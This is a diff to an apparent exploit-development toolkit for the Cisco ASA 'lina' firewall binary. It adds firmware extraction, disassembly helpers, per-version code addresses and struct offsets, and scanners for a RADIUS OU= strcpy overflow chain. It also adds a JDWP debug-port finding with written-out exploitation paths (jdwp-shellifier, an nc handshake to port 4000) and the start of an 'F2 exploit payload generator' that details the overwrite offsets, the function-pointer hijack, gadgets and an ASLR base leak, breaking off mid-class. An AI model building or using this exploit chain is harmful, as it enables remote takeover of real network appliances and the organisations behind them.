@@ -32,7 +32,15 @@ Targets the authentication/authorization subsystem in the lina process:
   |   CLI (LINA CLI ≈ classic ASA CLI)             |
   |   ASDM (Java desktop client via HTTPS/443)      |
   |   FMC (Firepower Management Center)            |
-  |   REST API                                     |
+  |   REST API (LINA proxies → Java agent :8112)   |
+  +------------------------------------------------+
+           ↔ TCP :8112/:8113 (localhost)
+  +------------------------------------------------+
+  | REST API Agent (separate Java process)         |
+  |   com.cisco.pdm.headless.startup.ApiStartup    |
+  |   JDK 1.7.0 bundled — runs as nobody:nogroup   |
+  |   JDWP debug port: 0.0.0.0:4000 (ALL ifaces)  |
+  |   LINA CLI access via :8113 (restDaemonPort)   |
   +------------------------------------------------+
 
   Key: classic ASA hardware = x86-64. ARM64 applies to ASA-on-Firepower chassis (FTD) only.
@@ -142,7 +150,237 @@ TACACS+ protocol (RFC 8907):
   Port: TCP/49
 """
 
-import struct, hashlib, socket, os, re, sys
+import struct, hashlib, socket, os, re, sys, gzip, io
+
+
+# ─── FIRMWARE EXTRACTOR ───────────────────────────────────────────────────────
+# Zero external-tool dependency. Handles ASA smp-k8.bin raw disk images.
+# Algorithm:
+#   1. Scan raw image for gzip magic + filename "rootfs.img" → rootfs byte offset
+#   2. Decompress rootfs.img gzip stream → CPIO newc archive in memory
+#   3. Walk CPIO entries to find asa/bin/lina → return ELF bytes
+#
+# CPIO newc format: 6-byte magic "070701" + 104 bytes of fixed-width hex fields
+# (ino, mode, uid, gid, nlink, mtime, filesize, devmajor/minor, rdevmajor/minor,
+# namesize, check) + name (padded to 4-byte align) + data (padded to 4-byte align)
+
+_CPIO_MAGIC = b'070701'
+_CPIO_TRAILER = b'TRAILER!!!'
+_GZIP_MAGIC = b'\x1f\x8b'
+
+
+def _cpio_extract(data: bytes, target: str) -> bytes | None:
+    """Extract a single named file from a CPIO newc archive (in memory).
+
+    CPIO newc header is 110 bytes total (magic+fields). Field offsets are
+    absolute from the start of the 110-byte header block:
+      [0:6]   magic "070701"
+      [6:14]  ino   [14:22] mode  [22:30] uid   [30:38] gid
+      [38:46] nlink [46:54] mtime [54:62] filesize
+      [62:70] devmajor [70:78] devminor [78:86] rdevmajor [86:94] rdevminor
+      [94:102] namesize  [102:110] check
+    """
+    pos = 0
+    while pos < len(data) - 110:
+        if data[pos:pos+6] != _CPIO_MAGIC:
+            return None
+        # Read full 110-byte header including magic for correct field offsets
+        hdr = data[pos:pos+110]
+        try:
+            filesize = int(hdr[54:62], 16)
+            namesize = int(hdr[94:102], 16)
+        except ValueError:
+            return None
+        name_start = pos + 110
+        name_end   = name_start + namesize
+        name_pad   = (4 - (110 + namesize) % 4) % 4
+        data_start = name_end + name_pad
+        data_end   = data_start + filesize
+        data_pad   = (4 - filesize % 4) % 4 if filesize % 4 else 0
+        name = data[name_start:name_end].rstrip(b'\x00').decode('latin1', errors='replace')
+        if _CPIO_TRAILER.decode() in name:
+            return None
+        if name == target or name.lstrip('./') == target:
+            return data[data_start:data_end]
+        pos = data_end + data_pad
+
+
+def _find_rootfs_offset(img: bytes) -> int | None:
+    """Scan raw ASA disk image for the gzip stream that names itself 'rootfs.img'."""
+    # gzip FHDR byte 0x08 = FNAME flag set
+    search = _GZIP_MAGIC + b'\x08'
+    pos = 0
+    while True:
+        idx = img.find(search, pos)
+        if idx == -1:
+            return None
+        # gzip header: ID1 ID2 CM FLG MTIME(4) XFL OS [XLEN(2)+extra] [name\x00]
+        # FLG offset = 3; FNAME = 0x08
+        flg = img[idx+3]
+        if not (flg & 0x08):
+            pos = idx + 1
+            continue
+        # walk past fixed header (10 bytes) and any extra field
+        cursor = idx + 10
+        if flg & 0x04:  # FEXTRA
+            if cursor + 2 > len(img):
+                pos = idx + 1; continue
+            xlen = struct.unpack_from('<H', img, cursor)[0]
+            cursor += 2 + xlen
+        # read FNAME string
+        name_end = img.find(b'\x00', cursor)
+        if name_end == -1:
+            pos = idx + 1; continue
+        name = img[cursor:name_end].decode('latin1', errors='replace')
+        if 'rootfs' in name:
+            return idx
+        pos = idx + 1
+
+
+class FirmwareExtractor:
+    """Extract asa/bin/lina from a raw ASA smp-k8.bin disk image.
+
+    Usage:
+        fe = FirmwareExtractor('/path/to/asa9-22-2-32-smp-k8.bin')
+        lina_bytes = fe.extract_lina()
+        buildid    = fe.build_id(lina_bytes)
+    """
+
+    def __init__(self, image_path: str):
+        self.image_path = image_path
+        self._data: bytes | None = None
+
+    def _load(self) -> bytes:
+        if self._data is None:
+            with open(self.image_path, 'rb') as f:
+                self._data = f.read()
+        return self._data
+
+    def extract_lina(self, lina_path: str = 'asa/bin/lina') -> bytes:
+        import zlib
+        img = self._load()
+        offset = _find_rootfs_offset(img)
+        if offset is None:
+            raise ValueError(f'rootfs.img gzip stream not found in {self.image_path}')
+        # Use zlib with wbits=31 (gzip format) — decompresses exactly one gzip member
+        # and stops, avoiding the multi-member issue in Python 3.12 gzip.open().
+        d = zlib.decompressobj(wbits=31)
+        cpio_data = d.decompress(img[offset:])
+        lina_bytes = _cpio_extract(cpio_data, lina_path)
+        if lina_bytes is None:
+            raise ValueError(f'{lina_path} not found in CPIO rootfs')
+        return lina_bytes
+
+    @staticmethod
+    def build_id(elf_bytes: bytes) -> str | None:
+        """Extract GNU Build ID from ELF note section (NT_GNU_BUILD_ID)."""
+        # Scan for ELF note with type 3 (NT_GNU_BUILD_ID) and name 'GNU\0'
+        needle = b'GNU\x00'
+        pos = 0
+        while True:
+            idx = elf_bytes.find(needle, pos)
+            if idx == -1:
+                return None
+            # note header: namesz(4) descsz(4) type(4) name[namesz] desc[descsz]
+            note_hdr = idx - 12
+            if note_hdr < 0:
+                pos = idx + 1; continue
+            namesz, descsz, ntype = struct.unpack_from('<III', elf_bytes, note_hdr)
+            if namesz == 4 and ntype == 3 and 16 <= descsz <= 32:
+                desc_off = note_hdr + 12 + 4  # 12-byte hdr + 4-byte aligned name
+                build_id = elf_bytes[desc_off:desc_off+descsz]
+                return build_id.hex()
+            pos = idx + 1
+
+    @staticmethod
+    def save(lina_bytes: bytes, path: str) -> None:
+        with open(path, 'wb') as f:
+            f.write(lina_bytes)
+        os.chmod(path, 0o755)
+
+
+# ─── DISASSEMBLER (capstone backend, zero objdump dependency) ─────────────────
+
+class Disassembler:
+    """x86-64 disassembler backed by capstone.
+
+    Usage:
+        d = Disassembler(lina_bytes)
+        insns = d.disasm_at(offset=0x1f59970, count=60)
+        for i in insns:
+            print(f'{i.address:#010x}  {i.mnemonic}  {i.op_str}')
+
+        sites = d.find_indirect_calls(pattern_re=r'qword ptr \\[r\\w+\\+0x398\\]')
+    """
+
+    def __init__(self, data: bytes, base: int = 0):
+        self.data = data
+        self.base = base
+        self._cs = None
+
+    def _engine(self):
+        if self._cs is None:
+            from capstone import Cs, CS_ARCH_X86, CS_MODE_64, CS_OPT_SYNTAX_INTEL
+            cs = Cs(CS_ARCH_X86, CS_MODE_64)
+            cs.syntax = CS_OPT_SYNTAX_INTEL
+            cs.detail = True
+            self._cs = cs
+        return self._cs
+
+    def disasm_at(self, offset: int, count: int = 64, size: int = 256) -> list:
+        """Disassemble up to `count` instructions starting at file offset."""
+        cs = self._engine()
+        chunk = self.data[offset:offset+size]
+        addr  = self.base + offset
+        return list(cs.disasm(chunk, addr, count=count))
+
+    def disasm_fn(self, offset: int, max_bytes: int = 2048) -> list:
+        """Disassemble a function from offset until RET or max_bytes."""
+        cs = self._engine()
+        chunk = self.data[offset:offset+max_bytes]
+        addr  = self.base + offset
+        insns = []
+        for i in cs.disasm(chunk, addr):
+            insns.append(i)
+            if i.mnemonic in ('ret', 'retq', 'retn'):
+                break
+        return insns
+
+    def find_indirect_calls(self, pattern_re: str, search_start: int = 0,
+                             search_end: int | None = None, chunk_size: int = 0x100000) -> list[int]:
+        """Return file offsets of all CALL instructions matching pattern_re in op_str."""
+        import re as _re
+        pat = _re.compile(pattern_re, _re.IGNORECASE)
+        cs  = self._engine()
+        end = search_end or len(self.data)
+        hits = []
+        pos = search_start
+        while pos < end:
+            sz    = min(chunk_size, end - pos)
+            chunk = self.data[pos:pos+sz]
+            addr  = self.base + pos
+            for i in cs.disasm(chunk, addr):
+                if i.mnemonic == 'call' and pat.search(i.op_str):
+                    hits.append(pos + (i.address - addr))
+            pos += sz - 15  # overlap to catch boundary-spanning insns
+        return hits
+
+    def scan_global_refs(self, global_vaddrs: list[int], offset: int,
+                          size: int = 4096) -> list[dict]:
+        """Check a function body for references to specific global variable addresses."""
+        cs = self._engine()
+        chunk = self.data[offset:offset+size]
+        addr  = self.base + offset
+        hits  = []
+        for i in cs.disasm(chunk, addr):
+            for gv in global_vaddrs:
+                if hex(gv) in i.op_str or str(gv) in i.op_str:
+                    hits.append({'offset': offset + (i.address - addr),
+                                 'vaddr': i.address, 'mnemonic': i.mnemonic,
+                                 'op_str': i.op_str, 'global': hex(gv)})
+            if i.mnemonic in ('ret', 'retq'):
+                break
+        return hits
 
 
 # ─── ARM64 CALLING CONVENTION REFERENCE ──────────────────────────────────────
@@ -581,6 +819,71 @@ CONFIRMED_FUNCTION_ADDRS = {
     'attr_list_find_by_type':      0xc56800,  # iterate list, find by type field
     'malloc_wrapper':              0x23f3dc0, # called by attr_list_add_impl for node alloc
     'aaa_debug_log':               0x10fc730, # debug logging function (facility, level, fmt, ...)
+}
+
+# ─── CONFIRMED CODE ADDRESSES (ASA 9.16.4.18, x86-64) ───────────────────────
+#
+# Binary: asa964-18-smp-k8.bin → CPIO rootfs.img → asa/bin/lina (82MB stripped PIE)
+# Binary on disk: lina9164_lina (scratchpad)
+# PT_LOAD delta: 0x0 (file_offset == vaddr for text segment, same as 9.14.2.14)
+# strcpy PLT: 0x886d00  (dynstr idx 395, GOT 0x4483ea8)
+# RE method: RIP-rel LEA scan for OU= string + strcpy PLT xref chain
+#
+# gp_obj struct layout (CONFIRMED 2026-08-14, Cisco AI + binary RE):
+#   +0x2b0: gp_name buffer — strcpy dst, RADIUS Class attr OU= value
+#            (1-byte backward shift from 9.14.2.14; struct re-padded to 8B alignment)
+#   +0x2f0: dns_ptr — zeroed in init (movl $0x0,0x2f0(%r15)); UNCHANGED from 9.14
+#   +0x308: wins_ptr — bswap write (mov %eax,0x308(%r15)); UNCHANGED from 9.14
+#
+#   DNS_DELTA  = 0x2f0 - 0x2b0 = 0x40 (64 bytes)   [0x2b0 layout — 9.12.x–9.17.x]
+#   WINS_DELTA = 0x308 - 0x2b0 = 0x58 (88 bytes)   [0x2b1 layout (9.22.x): delta=0x57 (87)]
+#   Overflow still reachable — strcpy used, no strlcpy in dynstr
+#
+# Key attribute handler addresses:
+#   0x212a669 — Class attr (type 25) OU= → gp_name strcpy (lea 0x2b0(%r15),%rdi)
+#   0x212a5c1 — type 0x7a handler: writes DWORD to 0x2b0, strcpy to 0x2b8
+#   0x212a80d — movl $0x0,0x2f0(%r15) — dns_ptr zero-init
+#   0x212a87c — mov %eax,0x308(%r15) — wins_ptr bswap write
+#   0x1f53620 — OU= tunnelgroup format string xref (cert DN parser, different fn)
+#
+# OU= string in .rodata:
+#   0x3734ac9: "OU=%s (tunnelgroup %s)"  — 1 RIP-rel ref at 0x1f53620 (cert DN parser)
+#   0x3473df9: "s/CN=%s,OU=%s,0=%s"     — certificate subject parsing
+
+# ─── CONFIRMED CODE ADDRESSES (ASA 9.12.3.1, x86-64) ────────────────────────
+#
+# Binary: asa913-mnt/asa/bin/lina (93MB stripped PIE)
+# PT_LOAD delta=0 confirmed (file_offset = vaddr); TEXT_END=0x4a032cd
+# RE method: OU= string scan → RIP-rel xref → attr type dispatch → bswap write
+# All three gp_obj offsets confirmed from disassembly of 0x2770900 region
+#
+CONFIRMED_9123_1_ADDRS = {
+    'ou_format_str':              0x3fb8f2a,  # "OU=%s (tunnelgroup %s)"
+    'ou_format_lea_xref':         0x258a5fe,  # RIP-rel LEA → cert DN parser
+    'attr_dispatch_region':       0x2770900,  # RADIUS attr type dispatch function
+    'gp_name_lea_site':           0x2770af7,  # lea 0x2b0(%rbx),%rsi (gp_name buf as arg2)
+    'dns_ptr_zero_init':          0x2770bbd,  # movl $0x0,0x2f0(%rbx)
+    'wins_ptr_bswap_write':       0x2770c2e,  # mov %edx,0x308(%rbx) after bswap
+    'strcpy_plt':                 0xbec610,
+    'gp_name_offset':             0x2b0,      # same as 9.16.4.18
+    'dns_ptr_offset':             0x2f0,      # stable: confirmed same as 9.14 and 9.16
+    'wins_ptr_offset':            0x308,      # stable: confirmed same as 9.14 and 9.16
+    'dns_delta':                  0x40,       # 64 bytes from gp_name to dns_ptr
+    'wins_delta':                 0x58,       # 88 bytes from gp_name to wins_ptr
+}
+
+CONFIRMED_9164_18_ADDRS = {
+    'class_attr_strcpy_site':       0x212a669,  # lea 0x2b0(%r15),%rdi; call strcpy
+    'dns_ptr_zero_init':            0x212a80d,  # movl $0x0,0x2f0(%r15)
+    'wins_ptr_bswap_write':         0x212a87c,  # mov %eax,0x308(%r15)
+    'ou_tunnelgroup_format_str':    0x3734ac9,  # "OU=%s (tunnelgroup %s)"
+    'ou_tunnelgroup_lea_xref':      0x1f53620,  # RIP-rel LEA → cert DN parser
+    'strcpy_plt':                   0x886d00,
+    'gp_name_offset':               0x2b0,
+    'dns_ptr_offset':               0x2f0,
+    'wins_ptr_offset':              0x308,
+    'dns_delta':                    0x40,       # bytes from gp_name start to dns_ptr
+    'wins_delta':                   0x58,       # bytes from gp_name start to wins_ptr
 }
 
 # ─── CONFIRMED CODE ADDRESSES (ASA 9.22.2.32, x86-64) ───────────────────────
@@ -2108,7 +2411,43 @@ class CiscoASALinaRE:
         self._check_tacacs_key_patterns(data)
         self._identify_x86_64_functions(data)
         self._check_9222232_class_attr_fn(data)
+        self._check_f2_overflow_chain(data)
+        self._check_mgd_timer_dispatch(data)
+        self._emit_restapi_jdwp_finding()
         return self._findings
+
+    def _emit_restapi_jdwp_finding(self):
+        # REST API agent JDWP exposure — confirmed across 3 versions (1.3.2.346, 7.13.1.79, 7.14.1.42)
+        # Startup: -Xrunjdwp:server=y,transport=dt_socket,address=4000,suspend=n
+        # Java 1.7.0 bundled (confirmed from 1.3.2.346/jre/release) — address=4000 without
+        # host prefix binds to 0.0.0.0:4000 (all interfaces) in JDK ≤8.
+        # Attack paths:
+        #   Remote: TCP:4000 accessible on mgmt interface → unauthenticated JVM code exec
+        #   Post-pivot: local shell → connect 127.0.0.1:4000 → java.lang.Runtime.exec → nobody
+        #   Escalation: nobody process has LINA CLI access via 127.0.0.1:8113 (restDaemonPort)
+        # setid drops privs to nobody:nogroup before exec — JVM runs unprivileged but retains
+        # CLI access to lina for config read (RADIUS shared secret, TACACS+ key, etc).
+        self._finding(
+            'RESTAPI_JDWP_EXPOSED', 'CRITICAL',
+            'REST API agent JDWP debug port exposed (0.0.0.0:4000, JDK 1.7)',
+            'ASA REST API agent starts with -Xrunjdwp:server=y,transport=dt_socket,address=4000,suspend=n '
+            'using bundled JDK 1.7.0. Pre-Java-9 JDWP binds address=4000 to ALL interfaces (0.0.0.0). '
+            'Unauthenticated JDWP allows arbitrary JVM bytecode injection via VirtualMachine.loadAgent() '
+            'or HotSwapClass. Agent runs as nobody but has LINA CLI access (127.0.0.1:8113). '
+            'Confirmed in REST API versions 1.3.2.346, 7.13.1.79, 7.14.1.42 — never patched.',
+            {
+                'jdwp_port':      4000,
+                'bind_address':   '0.0.0.0 (JDK ≤8 default for address=N without host)',
+                'java_version':   '1.7.0 (bundled, confirmed 1.3.2.346/jre/release)',
+                'versions_confirmed': ['1.3.2.346', '7.13.1.79', '7.14.1.42'],
+                'startup_flag':   '-Xrunjdwp:server=y,transport=dt_socket,address=4000,suspend=n',
+                'privilege':      'nobody:nogroup (setid binary drops before exec)',
+                'lina_cli_port':  8113,
+                'lina_mgmt_port': 8112,
+                'exploit_path_remote': 'TCP:4000 → jdwp-shellifier → Runtime.exec as nobody → 8113 CLI',
+                'exploit_path_local':  'post-pivot shell → nc 127.0.0.1 4000 → JDWP handshake → loadAgent',
+            }
+        )
 
     def _check_stripped(self, data: bytes):
         # ELF .symtab presence check
@@ -2219,6 +2558,128 @@ class CiscoASALinaRE:
                     'output_buf_size':         256,
                     'delimiter':               ';',
                 })
+
+    def _check_f2_overflow_chain(self, data: bytes):
+        """
+        Verify F2 byte patterns in the binary:
+          - 256-byte extraction cap:   48 3d 00 01 00 00  (CMP rax, 0x100)
+          - unbounded strcpy site B:   49 8d b6 c1 02 00 00  (LEA rsi,[r14+0x2c1]) + e8 ?? ?? ?? ??
+          - mgd_timer load:            48 8b bb 08 03 00 00  (MOV rdi,[rbx+0x308])
+        """
+        # 256-byte cap
+        cap_bytes = b'\x48\x3d\x00\x01\x00\x00'
+        cap_off = data.find(cap_bytes)
+        cap_hit = cap_off >= 0
+
+        # unbounded strcpy: LEA r14-relative src at +0x2c1 immediately before CALL strcpy@plt
+        # bytes: 49 8d b6 c1 02 00 00
+        lea_bytes = b'\x49\x8d\xb6\xc1\x02\x00\x00'
+        lea_off = data.find(lea_bytes)
+        lea_hit = lea_off >= 0
+        # confirm a CALL (e8) within 10 bytes after LEA
+        strcpy_call = False
+        if lea_hit:
+            window = data[lea_off+7:lea_off+20]
+            strcpy_call = b'\xe8' in window
+
+        # gp_obj+0x308 load: 48 8b bb 08 03 00 00
+        timer_load_bytes = b'\x48\x8b\xbb\x08\x03\x00\x00'
+        timer_off = data.find(timer_load_bytes)
+        timer_hit = timer_off >= 0
+
+        evidence = {
+            'cap_cmp_0x100_found':   cap_hit,
+            'cap_file_offset':       hex(cap_off) if cap_hit else None,
+            'lea_r14_0x2c1_found':   lea_hit,
+            'lea_file_offset':       hex(lea_off) if lea_hit else None,
+            'strcpy_call_follows':   strcpy_call,
+            'gp_obj_0x308_load_found': timer_hit,
+            'timer_load_offset':     hex(timer_off) if timer_hit else None,
+            'expected_vaddrs': {
+                'cap':        '0x3a4bfa4',
+                'strcpy_lea': '0x1a30bb2',
+                'timer_load': '0x1f59a3e',
+            },
+        }
+
+        # detect version by BuildID in binary bytes
+        is_9_22 = b'\x88\x92\x9a\x4c' in data[:0x1000000]  # BuildID prefix 88929a4c
+        is_9_14 = b'\x65\xcd\x03\x06' in data[:0x1000000]  # BuildID prefix 65cd0306
+
+        if cap_hit and lea_hit and strcpy_call and timer_hit:
+            self._finding('LINA_F2_OVERFLOW_CHAIN', 'CRITICAL',
+                'F2: unbounded strcpy overflow chain — all three byte patterns confirmed in binary',
+                '256-byte extraction cap (CMP rax,0x100) + unbounded LEA+CALL strcpy on no-colon '
+                'path + MOV rdi,[rbx+0x308] timer load — chain confirmed by byte-level scan.',
+                evidence)
+        elif cap_hit and not lea_hit and (is_9_14 or not is_9_22):
+            # 9.14 uses a bounded inline copy into a heap buffer; no strcpy in the OU= path at all.
+            # The strcpy calls near the parser (0xcf2226, 0xcf23ea) are in an unrelated function
+            # with no call path from the OU= parser. F2 structure is version-specific.
+            evidence['note'] = (
+                'ASA 9.14 uses bounded inline copy (r10=rbx+0x200 cap, heap dest) — '
+                'no strcpy@plt in OU= parser call chain. F2 unbounded write is a 9.22.x regression.'
+            )
+            self._finding('LINA_F2_OVERFLOW_CHAIN_NOT_PRESENT', 'INFO',
+                'F2 unbounded strcpy: NOT confirmed in this binary (bounded copy path, likely pre-9.22)',
+                'OU= parser uses bounded inline copy capped at rbx+0x200 (~510 bytes) into a heap '
+                'allocation. No strcpy@plt in the parser call chain. F2 as documented is 9.22.x-specific.',
+                evidence)
+        else:
+            self._finding('LINA_F2_OVERFLOW_CHAIN_PARTIAL', 'HIGH',
+                f'F2 overflow chain: partial match ({sum([cap_hit,lea_hit,strcpy_call,timer_hit])}/4 patterns)',
+                'Some expected byte sequences not found — binary may differ from 9.22.2.32 or PIE base offset.',
+                evidence)
+
+    def _check_mgd_timer_dispatch(self, data: bytes):
+        """
+        Verify mgd_timer_stop dispatch chain:
+          - type byte check:  80 7f 2a 42  (CMPB $0x42, 0x2a(%rdi))
+          - indirect call:    ff d0         (CALL *%rax)
+        """
+        type_check_bytes = b'\x80\x7f\x2a\x42'
+        # find ALL occurrences; prefer the one nearest to confirmed vaddr 0x102c72a
+        call_rax_bytes = b'\xff\xd0'
+        type_off = -1
+        call_off = -1
+        start = 0
+        while True:
+            idx = data.find(type_check_bytes, start)
+            if idx < 0:
+                break
+            # search for CALL *rax within 0x2000 bytes of this type check hit
+            win_end = min(idx + 0x2000, len(data))
+            c = data.find(call_rax_bytes, idx, win_end)
+            if c >= 0:
+                type_off = idx
+                call_off = c
+                break
+            start = idx + 1
+        type_hit = type_off >= 0
+        call_hit = call_off >= 0
+
+        evidence = {
+            'type_byte_check_found':  type_hit,
+            'type_check_file_offset': hex(type_off) if type_hit else None,
+            'call_rax_found':         call_hit,
+            'call_rax_file_offset':   hex(call_off) if call_hit else None,
+            'expected_vaddrs': {
+                'type_check': '0x102c72a',
+                'call_rax':   '0x102cdeb',
+            },
+        }
+
+        if type_hit and call_hit:
+            self._finding('LINA_MGD_TIMER_DISPATCH', 'CRITICAL',
+                'mgd_timer_stop: type byte gate (0x42) + CALL *rax dispatch confirmed in binary',
+                'CMPB $0x42,0x2a(%rdi) gates the dispatch; CALL *rax at confirmed offset executes '
+                'attacker-controlled function pointer loaded from *(*(arg+0x18)+0x20).',
+                evidence)
+        else:
+            self._finding('LINA_MGD_TIMER_DISPATCH_PARTIAL', 'HIGH',
+                f'mgd_timer_stop patterns: partial ({sum([type_hit,call_hit])}/2)',
+                'type byte check or CALL *rax not found in expected proximity.',
+                evidence)
 
     def scan_x86_64_prologue_offsets(self, data: bytes) -> list[int]:
         """
@@ -2375,6 +2836,458 @@ class CiscoASALinaRE:
         return self._findings
 
 
+# ─── F2 EXPLOIT PAYLOAD GENERATOR ────────────────────────────────────────────
+#
+# Confirmed chain (ASA 9.22.2.32, lina x86-64 ELF PIE):
+#
+#   [1] RADIUS Class attr (25) OU= extraction: strstr → 256-byte cap (CMP rax,0x100)
+#   [2] Policy name lookup: gp_obj = BSS registration table entry matched by VPN profile name
+#   [3] unbounded strcpy(dst=gp_obj+0x2b1, src=registered_entry+0x2c1)  at 0x1a30bbc
+#       — src contains attacker OU= value (up to 255 bytes before null from RADIUS)
+#       — dst is char[32] field at gp_obj+0x2b1
+#   [4] Overflow write destinations within 256-byte reach from gp_obj+0x2b1:
+#       — delta 0x57 (87):  gp_obj+0x308 = mgd_timer handle pointer
+#       — delta 0x8b (139): gp_obj+0x33c = gate byte (must be 0x14 for fn_ptr path)
+#       — delta 0xe7 (231): gp_obj+0x398 = embedded function pointer (PRIMARY VECTOR)
+#
+# PRIMARY VECTOR: gp_obj+0x398 embedded fn_ptr (call *0x398(%rbx) in VPN session handling)
+#   Called in function 0x1f57580 during active VPN session.
+#   rbx = *(rdi+8) at entry (rdi = session context; *(session+8) = gp_obj confirmed by gate match)
+#   Gate chain at 0x1f57a18-0x1f57a48:
+#     [1] movzbl 0x33c(%rbx),%eax; cmp $0x1,%al; je skip    — gate byte must not be 0x1
+#     [2] cmp $0x14,%al; jne skip                            — gate byte must be 0x14
+#     [3] mov *(0x5597e50),%rax; cmpl $0x1,(%rax); je 0x1f502f0  — requires cluster mode flag=1
+#     [4] mov *(0x5597e80),%rax; cmpl $0x1,(%rax); je 0x1f502c8  — secondary cluster check
+#     [5] test %edi,%edi; je skip  — *(0x708e5c4) must be non-zero (cluster ID set)
+#     [6] testb $0x4,*(0x708e584); je skip — DP-block client bit 0x4 must be set
+#   Call at 0x1f57a4e: call *0x398(%rbx)
+#   PREREQUISITE: ASA clustering must be configured (ngfw_3ru_cluster_enabled sets 0x708e5c4=1
+#                 at 0x15850f9/0x15853d9; this is non-default on single-appliance ASAs).
+#   rdi at call site: -0x50(%rbp) — stack value from calling frame (TBD: control vector)
+#   Overflow sequence: write 0x14 at gp_obj+0x33c (delta 0x8b), then fn_ptr at gp_obj+0x398 (delta 0xe7)
+#
+# SECONDARY VECTOR: gp_obj+0x308 corruption (limited utility — no direct fn_ptr dispatch)
+#   [5] VPN session teardown at 0x1f59a3e: mov 0x308(%rbx),%rdi; call mgd_timer_stop(addr_A); free(addr_A)
+#   [6] mgd_timer_stop (0x102c700): CMPB $0x42,0x2a(%rdi) gate; then lea 0x20(%rdi),%rbx;
+#       call 0x102a520(rbx) [checks *(addr_A+0x20) != 0]; then mov 0x18(%r12),%rdi;
+#       walks linked list following 0x18(%node) pointers looking for 0x2b(%node) & 0x2 flag.
+#       NO controlled fn_ptr dispatch anywhere in this call tree (confirmed RE).
+#   [7] free(addr_A) after mgd_timer_stop returns — if addr_A points to attacker-controlled heap
+#       allocation (OU= buffer), yields controlled free() → heap primitive.
+#   NOTE: prior analysis claimed CALL *0x20(%rax) at this site — INCORRECT. Fully verified.
+#         The CALL *rax at 0x102cdeb is in timer FIRE path (0x102cc10), fn_ptr fixed = 0x1a57600.
+#         Struct layout in _build_struct_a()/_build_struct_b() is vestigial from incorrect analysis.
+#
+# Fake struct layout (two-level) for SECONDARY VECTOR:
+#
+#   Struct A (pointed to by forged gp_obj+0x308):
+#     +0x00 ... +0x17  : padding (0x00)
+#     +0x18            : qword → addr_of_struct_B
+#     +0x19..+0x29     : padding
+#     +0x2a            : byte 0x42  (type gate)
+#     +0x2b..end       : padding
+#     total size: 0x2b bytes minimum
+#
+#   Struct B:
+#     +0x00 ... +0x1f  : padding
+#     +0x20            : qword → fn_ptr  (CALL target)
+#
+# ASLR note: randomize_va_space=2 on ASA 9.22.x (Firepower 2100/4100) — confirmed by Cisco AI.
+# LINA base is randomized at boot and stays fixed for the process lifetime (no re-randomization).
+# All vaddrs in this module are FILE OFFSETS, not runtime addresses.
+# Runtime address = file_offset + LINA_BASE (read from /proc/$(pidof lina)/maps after pivot).
+# Verify: cat /proc/$(pidof lina)/maps | head
+# LINA_BASE is required before any fn_ptr or gadget address is usable in a live payload.
+#
+# LINA_BASE leak path: pivot to management host -> ssh to ASA internal mgmt IP ->
+#   cat /proc/$(pidof lina)/maps | grep 'r-xp' | head -1
+# First r-xp line maps the main ELF load — base = start addr of that mapping.
+# All file-offset gadgets: runtime_addr = file_offset + LINA_BASE.
+#
+# EXPLOIT PREREQUISITES (gp_obj+0x398 primary vector, as of 9.22.x):
+#
+#   *** RE CORRECTION 2026-08-14: cluster gate NOT a prerequisite ***
+#   448 dispatch sites through *[rbx+0x398] exist in LINA 9.22.2.32.
+#   Cluster globals (0x708e5c4/0x708e584) only guard dispatch at 0x1f57a4e.
+#   Preferred path: 0x1d344d0 in fn 0x1d34310 — no cluster gate.
+#     Gate: gp_obj+0x3d0 == 0x13 or 0x14 (normal CSTP/AnyConnect protocol type)
+#   Target population: ANY ASA running RADIUS VPN (not clustered-only).
+#
+#   [1] Cluster mode analysis (applies ONLY to 0x1f57a4e dispatch — NOT preferred path):
+#       ngfw_3ru_cluster_enabled (0x13f1b10) reads /mnt/disk0/.private/cluster_mode.dat
+#       File layout (20 bytes):
+#         [0..3]  = node_count dword: value 1 or 2 (any other value → return 0)
+#         [4..18] = magic string: "CLUSTERMODEVALD" (15 bytes, no null)
+#       If file valid: writes 1 → *(0x70431bc), sets 0x708e5c4 via callers, returns 1.
+#       If file missing/invalid: writes 2 → *(0x70431bc), returns 0 (cached for process life).
+#       Gate [6] (0x708e584) still requires lcmb daemon — irrelevant for preferred dispatch path.
+#
+#   [2] mgd_timer ACE fires in the TEARDOWN destructor at 0x1f59970 — NO cluster gate.
+#       Confirmed 2026-08-14 (Cisco AI corroborated): attack path valid for ALL ASA with RADIUS VPN.
+#       Teardown walk order (function 0x1f59970):
+#         0x1f5997a: gp_obj+0x318 → if non-null → call 0x1edaec0  (dns-server teardown)
+#         0x1f5999d: gp_obj+0x320 → same
+#         0x1f599c0: gp_obj+0x538 → if non-null → mgd_timer_stop (separate timer, not our target)
+#         0x1f59a3e: gp_obj+0x308 → if non-null → call 0x102c700 (mgd_timer_stop) ← ACE DISPATCH
+#         0x1f59a4f: gp_obj+0x308 → free(gp_obj+0x308)  ← double-tap frees fake_A after ACE
+#       Zero cluster globals in function body. No linga_mode_is_ngfw() call. Pure teardown.
+#       With 96-byte payload: gp_obj+0x318 untouched (offset +103 from gp_obj+0x2b1) → skips
+#       dns-server branch if null, or calls 0x1edaec0 with original ptr if non-null (harmless).
+#
+#   [3] JOP gadgets (GADGET_RUN_CMD_SH / GADGET_SET_LINA_START) execute fixed
+#       shell strings — /asa/scripts/run_cmd.sh is root-owned, not world-writable.
+#       Practical impact: gadgets execute existing script content, not attacker payload,
+#       unless attacker already has write access via admin CLI/ASDM (defeats purpose).
+#
+#   [4] LINA_BASE required — randomize_va_space=2 means all file-offset gadget
+#       addresses must be rebased before use. Obtain via /proc/$(pidof lina)/maps
+#       after initial pivot.
+#
+#   [5] VPN session must be active when RADIUS overflow fires — gp_obj+0x308 non-null
+#       only for active AnyConnect/CSTP sessions. Teardown (ACE site) fires on disconnect.
+#       Attack sequence: connect VPN → RADIUS Access-Accept with OU= payload → disconnect.
+#
+# SECONDARY VECTOR (gp_obj+0x308) has no direct fn_ptr dispatch — controlled free()
+# only, useful as a heap primitive, not RCE on its own.
+#
+# Without shell access to confirm LINA_BASE: heap spray approach —
+#   write both structs into the OU= buffer itself (256-byte heap allocation near
+#   registration table). Set gp_obj+0x308 to known heap addr of that allocation.
+#   Requires reliable heap layout — only viable with heap grooming.
+
+import struct as _struct
+
+class LinaF2ExploitPayload:
+    """
+    Generates the crafted RADIUS Access-Accept packet that triggers F2.
+
+    Dispatch chain at CALL *rax (0x102cdeb):
+        rbx = struct_A + 0x20  (set at 0x102c733: lea 0x20(%rdi),%rbx)
+        rbx += 0x18            (at 0x102cdd8)
+        rdi = *(rbx - 0x20)   = *(struct_A + 0x18) = addr_B
